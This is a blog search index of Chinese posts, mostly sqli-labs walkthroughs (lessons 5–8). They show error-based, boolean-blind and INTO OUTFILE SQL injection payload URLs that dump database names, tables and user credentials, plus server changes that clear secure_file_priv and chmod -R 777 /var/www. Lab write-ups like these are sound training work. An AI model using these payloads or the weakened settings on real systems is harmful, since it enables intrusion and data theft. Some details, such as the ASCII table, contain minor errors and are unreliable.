<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>我的博客</title>
      <link href="/2019/10/13/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/10/13/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="我为什么写博客？"><a href="#我为什么写博客？" class="headerlink" title="我为什么写博客？"></a>我为什么写博客？</h1><p>因为受朋友的影响，很早之前就在写笔记。写笔记的初衷是整合、巩固、记录自己学习的知识，如果有一天，我想回顾这些知识点，对照着曾经记录的笔记，会起到事半功倍的效果。但是时间长了，发现自己一直在偷懒，笔记写得囫囵吞枣，而且写着写着就半途而废，有些有用的知识点根本就没记录。以前也没有太过在意这些，但是工作后发现问题越来越多，因为实施过程没有及时做记录或记的不仔细，导致再次实施的时候还是不太懂，做了一半就卡住了。经过一段时间的思考和准备，我决定写博客，以此来解决我现在的困境，同时也希望我的博客能帮到别人。</p><h1 id="写博客的价值"><a href="#写博客的价值" class="headerlink" title="写博客的价值"></a>写博客的价值</h1><ul><li>总结知识</li></ul><p>写博客最主要还是给自己看，总结自己学到的知识。但是博客也是面向大众的，所以博客还需要写得详细，易懂，使不懂的人能够理解。</p><ul><li>克服懒惰</li></ul><p>写博客总是紧绷着一根弦，不断提醒自己，要坚持写博客，实现自己的承诺，不能让读者们等急了。有压力，才有动力，不至于浑浑噩噩度日。</p><ul><li>补充知识</li></ul><p>当你的博客写得有问题，读者会指出文章存的问题。如：知识点存在哪些漏洞，解释不够严谨等。</p><ul><li>扩大个人影响力</li></ul><p>坚持写博客，你的影响力便不知不觉地渗透出去。你的影响力越大，身边的机会就越多。</p><h1 id="我的博客计划"><a href="#我的博客计划" class="headerlink" title="我的博客计划"></a>我的博客计划</h1><p>每周写三篇文章：三天一篇文章，七天一篇科普文。</p><p>博客内容主要以工作、技术学习、科普为主。</p><ul><li><p>工作内容主要记录实施过程，并不会涉及到到太多的技术知识。</p></li><li><p>技术学习，这部分会涉及技术原理，我会尽量写的简洁易懂。</p></li><li><p>科普文内容要是记录生活中方方面面。</p></li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>写这么多，其实是想鼓励身边的朋友和读者们也去做自己的博客，记录自己点点滴滴，提升自我的价值。</p><p>可能有些人说自己不知道怎么写博客。其实，只要开始写，并坚持写，迟早会找到自己的 style，网络文章本来就是 “free style” 的。所以，那些想写，又没有写的朋友们，请踏出第一步，”向前看，齐步走”，然后奔跑。当然，认真写文章，必然会花去大量时间。如何去衡量，就需要自己去决定了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-Less8</title>
      <link href="/2019/10/08/sqli-labs-Less8/"/>
      <url>/2019/10/08/sqli-labs-Less8/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="什么是-SQL-盲注？"><a href="#什么是-SQL-盲注？" class="headerlink" title="什么是 SQL 盲注？"></a>什么是 SQL 盲注？</h2><p>SQL盲注，就是网页不会根据你写的 sql 攻击语句返回你想要知道的错误信息，所以只能通过一些手段来猜测判断网页输出的内容。</p><h2 id="SQL盲注的分类"><a href="#SQL盲注的分类" class="headerlink" title="SQL盲注的分类"></a>SQL盲注的分类</h2><ul><li>布尔盲注</li></ul><p>界面能返回两个值 “true” 或 “false” 即 “布尔值” 。当你输入的 SQL 攻击语句成功后，网页返回值为 “true”，也就是说网页会输出正常的界面；当你输入的SQL攻击语句失败后，网页返回值为 “false”，也就是说网页会输出不正常的界面（比如网页少了部分内容）</p><ul><li>时间盲注</li></ul><p>界面只能返回一个值 “true”，无论你输入任何值，网页都是按正常来处理。此时，SQL 攻击语句中会加入时间函数来判断注入的语句是否正确。比如我通过“时间函数”让网页等待10秒再返回正常的界面。如果我等待了10秒才接受到正常界面，说面我的注入语句是正确的；如果我很快就接受到正常的界面，说明我的注入语句是错误的。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>对于布尔盲注,需要先了解 length()、substr()、ascii() 这三个函数的功能。</p><p>length(str)：返回字符串（str）的长度</p><p><img src="https://i.loli.net/2019/10/09/zYrp1isWEgIDP7B.png" alt="less8-1.png"></p><p>substr(str,pos,len)：从字符串（str）的第几个字符（pos）开始截取多长的字符串（len）</p><p><img src="https://i.loli.net/2019/10/09/7hM3U9rWznldDXq.png" alt="less8-2.png"></p><p>ascii(str)：将字符串（str）转换成 ascii 码</p><p><img src="https://i.loli.net/2019/10/09/Afoa3q1tXkNYhCI.png" alt="less8-3.png"></p><p>常用的 ascii</p><table><thead><tr><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th></tr></thead><tbody><tr><td align="center">48</td><td align="center">0</td><td align="center">65</td><td align="center">A</td><td align="center">75</td><td align="center">K</td><td align="center">85</td><td align="center">U</td><td align="center">101</td><td align="center">e</td></tr><tr><td align="center">49</td><td align="center">1</td><td align="center">66</td><td align="center">B</td><td align="center">76</td><td align="center">L</td><td align="center">86</td><td align="center">V</td><td align="center">102</td><td align="center">f</td></tr><tr><td align="center">50</td><td align="center">2</td><td align="center">67</td><td align="center">C</td><td align="center">77</td><td align="center">M</td><td align="center">87</td><td align="center">W</td><td align="center">103</td><td align="center">g</td></tr><tr><td align="center">51</td><td align="center">3</td><td align="center">68</td><td align="center">D</td><td align="center">78</td><td align="center">N</td><td align="center">88</td><td align="center">X</td><td align="center">104</td><td align="center">h</td></tr><tr><td align="center">52</td><td align="center">4</td><td align="center">69</td><td align="center">E</td><td align="center">79</td><td align="center">O</td><td align="center">89</td><td align="center">Y</td><td align="center">105</td><td align="center">i</td></tr><tr><td align="center">53</td><td align="center">5</td><td align="center">70</td><td align="center">F</td><td align="center">80</td><td align="center">P</td><td align="center">90</td><td align="center">Z</td><td align="center">106</td><td align="center">j</td></tr><tr><td align="center">54</td><td align="center">6</td><td align="center">71</td><td align="center">G</td><td align="center">81</td><td align="center">Q</td><td align="center">97</td><td align="center">a</td><td align="center">107</td><td align="center">k</td></tr><tr><td align="center">55</td><td align="center">7</td><td align="center">72</td><td align="center">H</td><td align="center">82</td><td align="center">R</td><td align="center">98</td><td align="center">b</td><td align="center">108</td><td align="center">l</td></tr><tr><td align="center">56</td><td align="center">8</td><td align="center">73</td><td align="center">I</td><td align="center">83</td><td align="center">S</td><td align="center">99</td><td align="center">c</td><td align="center">109</td><td align="center">m</td></tr><tr><td align="center">56</td><td align="center">9</td><td align="center">74</td><td align="center">J</td><td align="center">84</td><td align="center">T</td><td align="center">100</td><td align="center">d</td><td align="center">110</td><td align="center">n</td></tr></tbody></table><table><thead><tr><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th><th align="center">ASCII值</th><th align="center">字符</th></tr></thead><tbody><tr><td align="center">111</td><td align="center">o</td><td align="center">112</td><td align="center">p</td><td align="center">113</td><td align="center">q</td><td align="center">114</td><td align="center">r</td><td align="center">115</td><td align="center">s</td></tr><tr><td align="center">116</td><td align="center">t</td><td align="center">117</td><td align="center">u</td><td align="center">118</td><td align="center">v</td><td align="center">119</td><td align="center">w</td><td align="center">120</td><td align="center">x</td></tr><tr><td align="center">121</td><td align="center">y</td><td align="center">122</td><td align="center">z</td><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr></tbody></table><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><ol><li><p>使用 ascii() + length() 函数判断出查询内容的字符长度</p></li><li><p>多次使用 ascii() + substr() 函数判断每个字符</p></li><li><p>将判断出的字符整合，得到查询结果。</p></li></ol><h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><h2 id="基于布尔的单引号GET盲注"><a href="#基于布尔的单引号GET盲注" class="headerlink" title="基于布尔的单引号GET盲注"></a>基于布尔的单引号GET盲注</h2><ol><li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1'</code></pre><p><img src="https://i.loli.net/2019/10/09/XP1AsxCu6iI8Rpj.png" alt="less8-4.png"></p><p>注：网页不是正常界面，使用布尔盲注进行测试</p><ol start="2"><li><strong>判断数据库字符串的长度</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))&gt;55%23</code></pre><p><img src="https://i.loli.net/2019/10/09/Yei8ndPQJ39HzGB.png" alt="less8-5.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))&gt;56%23</code></pre><p><img src="https://i.loli.net/2019/10/09/ZRunGcPSwdhg5bT.png" alt="less8-6.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))=56%23</code></pre><p><img src="https://i.loli.net/2019/10/09/sePb4EIMOg19KW6.png" alt="less8-7.png"></p><ol start="3"><li><strong>判断数据库名称</strong></li></ol><p><strong>判断第一个字母</strong></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),1,1))&gt;110%23</code></pre><p><img src="https://i.loli.net/2019/10/09/KE7wlrNu1GSgVav.png" alt="less8-8.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),1,1))&gt;115%23</code></pre><p><img src="https://i.loli.net/2019/10/09/eFXs9IfU2nNCASH.png" alt="less8-9.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),1,1))=115%23</code></pre><p><img src="https://i.loli.net/2019/10/09/r8f1K9OlnySh3FC.png" alt="less8-10.png"></p><p>注：第一个字符串的 ascii 值为 115，从上面的 ascii 表中可以找到相应的字符为 “ s ” </p><p><strong>判断第二个字母</strong></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))&gt;100%23</code></pre><p><img src="https://i.loli.net/2019/10/09/DzgLq2x9WAtwKF7.png" alt="less8-11.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))&gt;101%23</code></pre><p><img src="https://i.loli.net/2019/10/09/w2CADSa6zbhXlNG.png" alt="less8-12.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))=101%23</code></pre><p><img src="https://i.loli.net/2019/10/09/AMoWTIfOYiZkuJ9.png" alt="less8-13.png"></p><p>注：第一个字符串的 ascii 值为 101，从上面的 ascii 表中可以找到相应的字符为 “ e ” </p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.cnblogs.com/omnis/p/8318639.html" target="_blank" rel="noopener">【sqli-labs】 less8 GET - Blind - Boolian Based - Single Quotes (基于布尔的单引号GET盲注)</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Web security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-Less7</title>
      <link href="/2019/10/05/sqli-labs-Less7/"/>
      <url>/2019/10/05/sqli-labs-Less7/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次的标题是 dump into file 经过一些简单的测试，发现报错注入行不同，一些正常的注入也没有回显。所以结合标题 说明这题需要新的思路和手段。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>outfile：导出检索出的数据<br>loadfile：将表的内容导出为一个文本文件（一次导出一行）<br>dumpfile：将数据导入 MYSQL</p><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>这个原理其实比较简单。就是利用语句 <code>into outfile ” 路径（服务器）”</code> 可以把内容输出到，服务器上该路径的文本中。</p><h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><h2 id="导出文件GET字符型注入"><a href="#导出文件GET字符型注入" class="headerlink" title="导出文件GET字符型注入"></a>导出文件GET字符型注入</h2><ol><li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-7/?id=1'</code></pre><p><img src="https://i.loli.net/2019/10/07/ESFlPXGr9OCgUK3.png" alt="less7-1.png"></p><p>注：”You have an error in your SQL syntax“ 这里数据库的报错信息被屏蔽了，所以只能手动猜测 sql 语句。</p><ol start="2"><li><strong>使用“单引号+括号”判断执行的 SQL 语句</strong></li></ol><pre><code>192.168.150.128/sqli-labs-master/Less-7/?id=1')%23</code></pre><p><img src="https://i.loli.net/2019/10/07/ISi9sjTpxAPZB5H.png" alt="less7-2.png"></p><ol start="3"><li><strong>使用“单引号+括号+括号”判断执行的 SQL 语句</strong></li></ol><pre><code>192.168.150.128/sqli-labs-master/Less-7/?id=1'))%23</code></pre><p><img src="https://i.loli.net/2019/10/07/yRmgzXBYV4CZLrT.png" alt="less7-3.png"></p><p>注：输出正常，sql 语句为：select * from table where id=((‘input’))</p><ol start="4"><li><strong>判断字段数</strong></li></ol><pre><code>192.168.150.128/sqli-labs-master/Less-7/?id=1')) order by 4%23</code></pre><p><img src="https://i.loli.net/2019/10/07/HuKiOyUJlBtWZgc.png" alt="less7-4.png"></p><ol start="5"><li><strong>测试当前用户权限</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-7/?id=1')) and(select count(*) from mysql.user)&gt;0%23</code></pre><ol start="6"><li><strong>在服务器端修改 mysql 配置文件（开启 mysql 数据导入导出功能）</strong></li></ol><pre class=" language-bash"><code class="language-bash">/** 编辑 my.cnf 文件 **/<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vim /etc/my.cnf</span>/** 在文件中添加如下内容，如下图所示 **/secure_file_priv<span class="token operator">=</span><span class="token string">''</span></code></pre><p><img src="https://i.loli.net/2019/10/07/xX2aeIRbUfPiql9.png" alt="less7-5.png"></p><pre class=" language-bash"><code class="language-bash">/** 重启 mariadb **/<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl restart mariadb</span></code></pre><pre class=" language-bash"><code class="language-bash">/** 设置 /var/www 权限 **/<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># chmod -R 777 /var/www</span></code></pre><p>注：mysql 默认禁用数据导入导出功能。</p><ol start="6"><li><strong>导出数据到 “/var/www/html/test” 中</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-7/?id=1')) union select 1,2,3 into outfile "/var/www/html/test"%23</code></pre><p><img src="https://i.loli.net/2019/10/07/wXOMAL7Ul6vixdn.png" alt="less7-7.png"></p><p>注：网页报错，但是从服务器上可以看到数据已经成功导出。</p><ol start="7"><li><strong>查看导出的数据</strong></li></ol><p><img src="https://i.loli.net/2019/10/07/oXuEFwiafHs3G6k.png" alt="less7-8.png"></p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.php.cn/mysql-tutorials-401995.html" target="_blank" rel="noopener">mysql5.7导出数据提示–secure-file-priv选项问题的解决方法</a></p><p><a href="https://blog.csdn.net/baidu_37576427/article/details/76160309" target="_blank" rel="noopener">SQLI labs 第七课（神游太虚）</a></p><p><a href="https://www.cnblogs.com/omnis/p/8315087.html" target="_blank" rel="noopener">【sqli-labs】 less7 GET - Dump into outfile - String (导出文件GET字符型注入)</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Web security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-Less6</title>
      <link href="/2019/10/05/sqli-labs-Less6/"/>
      <url>/2019/10/05/sqli-labs-Less6/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没有什么好解释的，同 Less5 ，只不过 “单引号” 换成了 “双引号”。</p><h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><h2 id="双注入GET双引号字符型注入"><a href="#双注入GET双引号字符型注入" class="headerlink" title="双注入GET双引号字符型注入"></a>双注入GET双引号字符型注入</h2><ol><li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-6/?id=1"</code></pre><p><img src="https://i.loli.net/2019/10/05/o8WZNc9r7peLsjA.png" alt="less6-1.png"></p><ol start="2"><li><strong>判断字段数</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-6/?id=1" order by 4%23</code></pre><p><img src="https://i.loli.net/2019/10/05/EONfdcUSQuP1Vpn.png" alt="less6-2.png"></p><ol start="3"><li><strong>爆数据库名</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/10/05/nc3TCwSApW8uKIE.png" alt="less6-3.png"></p><ol start="4"><li><strong>爆表</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/10/05/kKYSVsCW7vwjbuz.png" alt="less6-4.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/10/05/L5jKOq4YnpSashy.png" alt="less6-5.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/10/05/h3G7LJvDkfjbwNO.png" alt="less6-6.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/10/05/j2DLGe1XZgksOVE.png" alt="less6-7.png"></p><ol start="5"><li><strong>爆字段</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/10/05/LKU591MmDXEpGv8.png" alt="less6-8.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/10/05/AubqBJvrEzWk5MR.png" alt="less6-9.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/10/05/eDoKxh7b6JHzNpt.png" alt="less6-10.png"></p><ol start="6"><li><strong>爆数据</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select username FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/10/05/Ve26puIBRHrD51J.png" alt="less6-11.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select password FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/10/05/Mfv81dRo2FGC39X.png" alt="less6-12.png"></p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.cnblogs.com/omnis/p/8314700.html" target="_blank" rel="noopener">【sqli-labs】 less6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Web security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-Less5</title>
      <link href="/2019/09/28/sqli-labs-Less5/"/>
      <url>/2019/09/28/sqli-labs-Less5/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="什么是双查询？"><a href="#什么是双查询？" class="headerlink" title="什么是双查询？"></a>什么是双查询？</h2><p>双查询就是在 select 语句中再插入一个 select 语句，如下图所示：</p><p><img src="https://i.loli.net/2019/10/02/1eMlHYmObKqn8GS.png" alt="5-1y.png"></p><p>在查询的时候，会先执行 select database() 语句，然后再将该语句的执行结果传递给 count() 函数，从内到外依次执行。</p><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><p>对于双查询注入,需要先了解 count()、rand()、floor() 这三个函数的功能，以及 group by 的用法。</p><p>floor()：去除小数</p><p><img src="https://i.loli.net/2019/10/02/Hnob26tvASWx7wj.png" alt="5-4y.png"></p><p>rand()：产生随机数</p><p><img src="https://i.loli.net/2019/10/02/O4pA3gywDohJab1.png" alt="5-3y.png"></p><p>count()：对表中的数据进行计数</p><p><img src="https://i.loli.net/2019/10/02/ZIVn7QrcJPYe2ol.png" alt="5-2y.png"></p><p>group by：根据规则，对数据进行分组处理。</p><h2 id="双查询注入产生原因"><a href="#双查询注入产生原因" class="headerlink" title="双查询注入产生原因"></a>双查询注入产生原因</h2><p>使用 group by 子句结合 rand() 函数以及像 count（*） 这样的聚合函数，在 SQL 查询时会出现错误，这种错误是随机产生的，这就产生了双重查询注入。</p><p><img src="https://i.loli.net/2019/10/02/4VhSFL5w6nruWyq.png" alt="5-5y.png"></p><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>以下面的查询语句为例：</p><pre class=" language-mysql"><code class="language-mysql">select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a;</code></pre><p><img src="https://i.loli.net/2019/10/03/5yvnlafeVmctWBJ.png" alt="5-7y.png"></p><p>首先，rand(0)的查询结果几乎消除了rand()函数原有的随机性，连续查询几次，我们会发现它的规律如下(01101)</p><p><img src="https://i.loli.net/2019/10/02/H3NOcbQEUSqxZve.png" alt="5-6y.png"></p><p>其次，使用 group by 语句和 count() 函数的时候，mysql 数据库会先建立一个虚拟表，当查询到新的键不在虚拟表中，数据库就会将其插入表中，如果数据库中已存在该键，则找到该键对应的计数字段并加 1。新建虚拟表如下：</p><style>table th:first-of-type {    height: 40px;    width: 350px;}</style><table><thead><tr><th align="center">键</th><th align="center">计数</th></tr></thead><tbody><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr></tbody></table><p>由于使用了 rand(0)，在查询虚拟表之前会先执行一下 floor(rand(0)*2))，第一次的到结果为 0，发现虚拟表中没有，所以此时要插入键 0。</p><p>但是对于数据库而言 rand(0)<em>2 是一个未知数，因此插入数据时 floor(rand(0)</em>2)) 函数又需要执行一遍，此时的查询结果为 1 (根据上一张图片查询结果 01101 可知，第二次查询结果为 1)，所以此时要插入键 1，取第一条记录查询，虚拟表如下：</p><table><thead><tr><th align="center">键</th><th align="center">计数</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">1</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr></tbody></table><p>取第二条记录查询，此时执行 floor(rand(0)*2)) 返回的结果为1(此时对应上面 01101 的第三次查询结果1)，查找虚拟表发现键 1 已经存在，所以直接加 1，虚拟表变化如下：</p><table><thead><tr><th align="center">键</th><th align="center">计数</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">2</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr></tbody></table><p>取第三条记录查询，此时执行 floor(rand(0)<em>2)) 返回的结果为 0 (此时对应上面 01101 的第四次查询结果 0)，发现虚拟表中没有键0，所以要将其写入虚拟表。同样在写入虚拟表的时候，floor(rand(0)</em>2)) 又执行了一遍，此时查询结果为上面 01101 的第五次结果 1，但是键1已经存在虚拟表中，由于键只能唯一，所以此时就会报错。</p><table><thead><tr><th align="center">键</th><th align="center">计数</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">2</td></tr><tr><td align="center"><font color="red"> 1 </font></td><td align="center"><font color="red"> 1 (报错)</font></td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr></tbody></table><p>所以在使用 floor()、rand(0)、count()、group by 时，数据表中至少要有 3 条记录才会报错.</p><h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><h2 id="双注入GET单引号字符型注入"><a href="#双注入GET单引号字符型注入" class="headerlink" title="双注入GET单引号字符型注入"></a>双注入GET单引号字符型注入</h2><ol><li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-5/?id=1' </code></pre><p><img src="https://i.loli.net/2019/09/28/r4PYNDvSRpHAQl1.png" alt="less5-2.png"></p><ol start="2"><li><strong>判断字段数</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-5/?id=1'  order by 4%23</code></pre><p><img src="https://i.loli.net/2019/09/28/HvSUCoZYGO4KAr2.png" alt="less5-3.png"></p><ol start="3"><li><strong>爆数据库名</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/09/28/8hGdsnq63wkr2WU.png" alt="less5-4.png"></p><ol start="4"><li><strong>爆表</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/09/28/R4aFOGnt5mcoKZP.png" alt="less5-5.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/09/28/kTKAdcUzHynXwgf.png" alt="less5-6.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/09/28/45gvlwQ6MEyVPHh.png" alt="less5-7.png"></p><pre><code>http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand(0)*2))a from information_schema.columns group by a%23</code></pre><p><img src="https://i.loli.net/2019/09/28/ZbhXlOisazPtnBM.png" alt="less5-8.png"></p><ol 